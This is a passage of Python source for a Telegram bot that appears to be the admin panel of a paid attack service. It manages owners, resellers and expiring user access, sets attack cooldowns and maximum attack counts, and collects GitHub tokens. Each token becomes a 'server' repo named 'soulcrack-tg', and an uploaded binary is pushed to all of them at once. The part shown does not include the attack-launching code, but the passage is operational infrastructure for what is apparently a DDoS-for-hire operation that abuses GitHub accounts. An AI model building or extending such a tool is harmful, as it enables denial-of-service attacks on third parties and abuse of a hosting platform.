        await update.message.reply_text("📭 NO USERS\nNo approved users found.")
        return
    
    users_list = "👥 APPROVED USERS LIST\n\n"
    for uid, data in approved_users.items():
        users_list += f"🆔 {uid}\n"
        users_list += f"👤 {data.get('username', 'N/A')}\n"
        users_list += f"⏰ Expires: {data.get('expiry_date', 'N/A')}\n\n"
    users_list += f"📊 Total: {len(approved_users)}"
    
    await update.message.reply_text(users_list)

async def addowner_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nOnly owners can add owners.")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /addowner <user_id>")
        return
    
    try:
        target_user_id = str(context.args[0])
        
        if target_user_id in owners:
            await update.message.reply_text("❌ User is already an owner")
            return
        
        owners[target_user_id] = {
            "username": f"owner_{target_user_id}",
            "added_by": str(user_id),
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "is_primary": False
        }
        save_owners(owners)
        
        await update.message.reply_text(f"✅ OWNER ADDED\nUser ID: {target_user_id}")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID")

async def deleteowner_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /deleteowner <user_id>")
        return
    
    target_user_id = str(context.args[0])
    
    if target_user_id not in owners:
        await update.message.reply_text("❌ USER NOT AN OWNER")
        return
    
    if owners[target_user_id].get('is_primary'):
        await update.message.reply_text("❌ Cannot delete primary owner")
        return
    
    del owners[target_user_id]
    save_owners(owners)
    
    await update.message.reply_text(f"✅ OWNER REMOVED\nUser ID: {target_user_id}")

async def addreseller_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /addreseller <user_id>")
        return
    
    try:
        target_user_id = str(context.args[0])
        
        if target_user_id in resellers:
            await update.message.reply_text("❌ User is already a reseller")
            return
        
        resellers[target_user_id] = {
            "username": f"reseller_{target_user_id}",
            "added_by": str(user_id),
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        save_resellers(resellers)
        
        await update.message.reply_text(f"✅ RESELLER ADDED\nUser ID: {target_user_id}")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID")

async def removereseller_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /removereseller <user_id>")
        return
    
    target_user_id = str(context.args[0])
    
    if target_user_id not in resellers:
        await update.message.reply_text("❌ USER NOT A RESELLER")
        return
    
    del resellers[target_user_id]
    save_resellers(resellers)
    
    await update.message.reply_text(f"✅ RESELLER REMOVED\nUser ID: {target_user_id}")

async def addtoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /addtoken <github_token>")
        return
    
    token = context.args[0]
    repo_name = "soulcrack-tg"
    
    try:
        for existing_token in github_tokens:
            if existing_token['token'] == token:
                await update.message.reply_text("❌ Token already exists.")
                return
        
        g = Github(token)
        user = g.get_user()
        username = user.login
        
        repo, created = create_repository(token, repo_name)
        
        new_token_data = {
            'token': token,
            'username': username,
            'repo': f"{username}/{repo_name}",
            'added_date': time.strftime("%Y-%m-%d %H:%M:%S"),
            'status': 'active'
        }
        
        github_tokens.append(new_token_data)
        save_github_tokens(github_tokens)
        
        if created:
            message = f"✅ NEW REPO CREATED & TOKEN ADDED!\nUsername: {username}\nRepo: {repo_name}\nTotal servers: {len(github_tokens)}"
        else:
            message = f"✅ TOKEN ADDED TO EXISTING REPO!\nUsername: {username}\nRepo: {repo_name}\nTotal servers: {len(github_tokens)}"
        
        await update.message.reply_text(message)
    except Exception as e:
        await update.message.reply_text(f"❌ ERROR\n{str(e)}")

async def removetoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /removetoken <number>")
        return
    
    try:
        token_num = int(context.args[0])
        if token_num < 1 or token_num > len(github_tokens):
            await update.message.reply_text(f"❌ Invalid number. Use 1-{len(github_tokens)}")
            return
        
        removed_token = github_tokens.pop(token_num - 1)
        save_github_tokens(github_tokens)
        
        await update.message.reply_text(f"✅ SERVER REMOVED!\nServer: {removed_token['username']}\nRepo: {removed_token['repo']}\nRemaining: {len(github_tokens)}")
    except ValueError:
        await update.message.reply_text("❌ Invalid number")

async def maintenance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global MAINTENANCE_MODE
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED")
        return
    
    MAINTENANCE_MODE = not MAINTENANCE_MODE
    save_maintenance_mode(MAINTENANCE_MODE)
    
    status = "ENABLED" if MAINTENANCE_MODE else "DISABLED"
    await update.message.reply_text(f"🔧 MAINTENANCE MODE {status}")

async def setcooldown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global COOLDOWN_DURATION
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /setcooldown <seconds>")
        return
    
    try:
        cooldown = int(context.args[0])
        if cooldown < 0:
            await update.message.reply_text("❌ Cooldown must be non-negative")
            return
        
        COOLDOWN_DURATION = cooldown
        save_cooldown(cooldown)
        
        await update.message.reply_text(f"✅ COOLDOWN SET\nNew cooldown: {cooldown} seconds")
    except ValueError:
        await update.message.reply_text("❌ Invalid number")

async def setmaxattack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global MAX_ATTACKS
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /setmaxattack <number>")
        return
    
    try:
        max_attacks = int(context.args[0])
        if max_attacks < 1:
            await update.message.reply_text("❌ Must be at least 1")
            return
        
        MAX_ATTACKS = max_attacks
        save_max_attacks(max_attacks)
        
        await update.message.reply_text(f"✅ MAX ATTACKS SET\nNew limit: {max_attacks}")
    except ValueError:
        await update.message.reply_text("❌ Invalid number")

async def binary_upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED")
        return ConversationHandler.END
    
    if not github_tokens:
        await update.message.reply_text("❌ NO SERVERS\nAdd tokens first using /addtoken")
        return ConversationHandler.END
    
    await update.message.reply_text("📤 BINARY UPLOAD\nSend me your binary file...")
    return WAITING_FOR_BINARY

async def handle_binary_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED")
        return ConversationHandler.END
    
    if not update.message.document:
        await update.message.reply_text("❌ Please send a file")
        return WAITING_FOR_BINARY
    
    progress_msg = await update.message.reply_text("📥 DOWNLOADING...")
    
    try:
        file = await update.message.document.get_file()
        file_path = f"temp_binary_{user_id}.bin"
        await file.download_to_drive(file_path)
        
        with open(file_path, 'rb') as f:
            binary_content = f.read()
        
        file_size = len(binary_content)
        await progress_msg.edit_text(f"📊 FILE: {file_size} bytes\n📤 Uploading...")
        
        success_count = 0
        fail_count = 0
        results = []
        
        def upload_to_repo(token_data):
            try:
                g = Github(token_data['token'])
                repo = g.get_repo(token_data['repo'])
                
                try:
                    existing_file = repo.get_contents(BINARY_FILE_NAME)
                    repo.update_file(BINARY_FILE_NAME, "Update binary", binary_content, existing_file.sha, branch="main")
                    results.append((token_data['username'], True, "Updated"))
                except:
                    repo.create_file(BINARY_FILE_NAME, "Upload binary", binary_content, branch="main")
                    results.append((token_data['username'], True, "Created"))
            except Exception as e:
                results.append((token_data['username'], False, str(e)))
        
        threads = []
        for token_data in github_tokens:
            thread = threading.Thread(target=upload_to_repo, args=(token_data,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        for username, success, status in results:
            if success:
                success_count += 1
            else:
                fail_count += 1
        
        os.remove(file_path)
        
        message = f"""✅ BINARY UPLOAD COMPLETED!

📊 RESULTS:
✅ Success: {success_count}
❌ Failed: {fail_count}
📊 Total: {len(github_tokens)}

📁 FILE: {BINARY_FILE_NAME}
📦 SIZE: {file_size} bytes"""
        
        await progress_msg.edit_text(message)
    except Exception as e:
        await progress_msg.edit_text(f"❌ ERROR\n{str(e)}")
    
    return ConversationHandler.END

async def cancel_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ CANCELLED")
    return ConversationHandler.END

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    conv_handler_binary = ConversationHandler(
        entry_points=[CommandHandler('binary_upload', binary_upload_command)],
        states={
            WAITING_FOR_BINARY: [
                MessageHandler(filters.Document.ALL, handle_binary_file),
                CommandHandler('cancel', cancel_handler)
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel_handler)]
    )
    
    application.add_handler(conv_handler_binary)
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("id", id_command))
    application.add_handler(CommandHandler("myaccess", myaccess_command))
    application.add_handler(CommandHandler("redeem", redeem_command))
    application.add_handler(CommandHandler("add", add_command))
    application.add_handler(CommandHandler("remove", remove_command))
    application.add_handler(CommandHandler("userslist", userslist_command))
    application.add_handler(CommandHandler("addowner", addowner_command))
    application.add_handler(CommandHandler("deleteowner", deleteowner_command))
    application.add_handler(CommandHandler("addreseller", addreseller_command))
    application.add_handler(CommandHandler("removereseller", removereseller_command))
    application.add_handler(CommandHandler("addtoken", addtoken_command))
    application.add_handler(CommandHandler("removetoken", removetoken_command))
    application.add_handler(CommandHandler("maintenance", maintenance_command))
    application.add_handler(CommandHandler("setcooldown", setcooldown_command))
    application.add_handler(CommandHandler("setmaxattack", setmaxattack_command))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_input))
    
    print("🤖 BOT RUNNING...")
    print(f"👑 Owners: {len(owners)}")
    print(f"📊 Users: {len(approved_users)}")
    print(f"💼 Resellers: {len(resellers)}")
    print(f"🔑 Servers: {len(github_tokens)}")
    print(f"🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}")
    print(f"⏳ Cooldown: {COOLDOWN_DURATION}s")
    print(f"🎯 Max Attacks: {MAX_ATTACKS}")
    
    application.run_polling()

if __name__ == '__main__':
    main()
